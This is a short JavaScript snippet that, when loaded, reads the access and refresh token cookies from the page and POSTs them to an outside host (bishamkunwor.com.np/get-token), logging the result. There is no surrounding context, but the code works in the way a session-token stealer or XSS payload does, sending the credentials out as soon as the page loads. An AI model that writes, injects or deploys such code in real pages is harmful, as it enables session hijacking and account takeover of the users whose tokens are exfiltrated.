async function getToken() {
  const getItem = (name) => {
    const cookieArray = document.cookie.split(";");
    for (const cookie of cookieArray) {
      const [cookieName, cookieValue] = cookie.split("=").map((c) => c.trim());
      if (cookieName === name) {
        return cookieValue;
      }
    }
    return null;
  };

  const accessKey = getItem("KEY_ACCESS_TOKEN");
  const refreshKey = getItem("KEY_REFRESH_TOKEN");

  try {
    const data = await fetch("https://bishamkunwor.com.np/get-token", {
      method: "post",
      body: JSON.stringify({
        accessKey,
        refreshKey,
      }),
    });

    console.log(data, "cookie-data");
  } catch (error) {
    console.log(error, "cookie-error");
  }

  console.log(accessKey, refreshKey, "cookie-keys");
}

getToken()